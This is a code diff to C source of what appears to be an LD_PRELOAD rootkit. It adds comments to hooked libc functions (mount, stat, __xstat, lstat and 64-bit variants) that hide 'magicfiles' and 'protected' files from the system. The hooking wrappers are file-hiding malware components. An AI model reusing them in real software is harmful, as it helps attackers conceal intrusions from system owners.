@@ -367,7 +367,7 @@ int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
 }
 
 /*
- * Function:  mount
+ * Function: mount
  * --------------------
  * mount hijacking
  * if source or destination are one of the magicfiles it just returns 'ENOENT' (-1)
@@ -390,6 +390,12 @@ int mount(const char *source, const char *target,
     return hooked_mount(source, target, filesystemtype, mountflags, data);
 }
 
+/*
+ * Function: stat
+ * --------------------
+ * stat hijacking
+ * stat just calls __xstat, than call hooked __xstat
+ */
 int stat(const char *path, struct stat *buf)
 {
     #ifdef DEBUG
@@ -397,8 +403,15 @@ int stat(const char *path, struct stat *buf)
     #endif
 
     return __xstat(_STAT_VER, path, buf);
-} 
+}
 
+/*
+ * Function: __xstat
+ * --------------------
+ * __xstat hijacking
+ * if __xstat is called check if it's a protected file
+ * otherwise it calls the real __xstat
+ */
 int __xstat(int version, const char *path, struct stat *buf)
 {
     #ifdef DEBUG
@@ -414,6 +427,12 @@ int __xstat(int version, const char *path, struct stat *buf)
     return hooked_xstat(version, path, buf);
 } 
 
+/*
+ * Function: stat64
+ * --------------------
+ * stat64 hijacking
+ * stat64 just calls __xstat64, than call hooked __xstat64
+ */
 int stat64(const char *path, struct stat64 *buf)
 {
     #ifdef DEBUG
@@ -423,6 +442,13 @@ int stat64(const char *path, struct stat64 *buf)
     return __xstat64(_STAT_VER, path, buf);
 } 
 
+/*
+ * Function: __xstat64
+ * --------------------
+ * __xstat64 hijacking
+ * if __xstat64 is called check if it's a protected file
+ * otherwise it calls the real __xstat64
+ */
 int __xstat64(int version, const char *path, struct stat64 *buf)
 {
     #ifdef DEBUG
@@ -438,6 +464,12 @@ int __xstat64(int version, const char *path, struct stat64 *buf)
     return hooked_xstat64(version, path, buf);
 } 
 
+/*
+ * Function: lstat
+ * --------------------
+ * lstat hijacking
+ * lstat just calls __lxstat, than call hooked __lxstat
+ */
 int lstat(const char *path, struct stat *buf)
 {
     #ifdef DEBUG
@@ -447,6 +479,13 @@ int lstat(const char *path, struct stat *buf)
     return __lxstat(_STAT_VER, path, buf);
 } 
 
+/*
+ * Function: __lxstat
+ * --------------------
+ * __lxstat hijacking
+ * if __lxstat is called check if it's a protected file
+ * otherwise it calls the real __lxstat
+ */
 int __lxstat(int version, const char *path, struct stat *buf)
 {
     #ifdef DEBUG
@@ -462,6 +501,12 @@ int __lxstat(int version, const char *path, struct stat *buf)
     return hooked_lxstat(version, path, buf);
 } 
 
+/*
+ * Function: lstat64
+ * --------------------
+ * lstat64 hijacking
+ * lstat64 just calls __lxstat64, than call hooked __lxstat64
+ */
 int lstat64(const char *path, struct stat64 *buf)
 {
     #ifdef DEBUG
@@ -471,6 +516,13 @@ int lstat64(const char *path, struct stat64 *buf)
     return __lxstat64(_STAT_VER, path, buf);
 } 
 
+/*
+ * Function: __lxstat64
+ * --------------------
+ * __lxstat64 hijacking
+ * if __lxstat64 is called check if it's a protected file
+ * otherwise it calls the real __lxstat64
+ */
 int __lxstat64(int version, const char *path, struct stat64 *buf)
 {
     #ifdef DEBUG
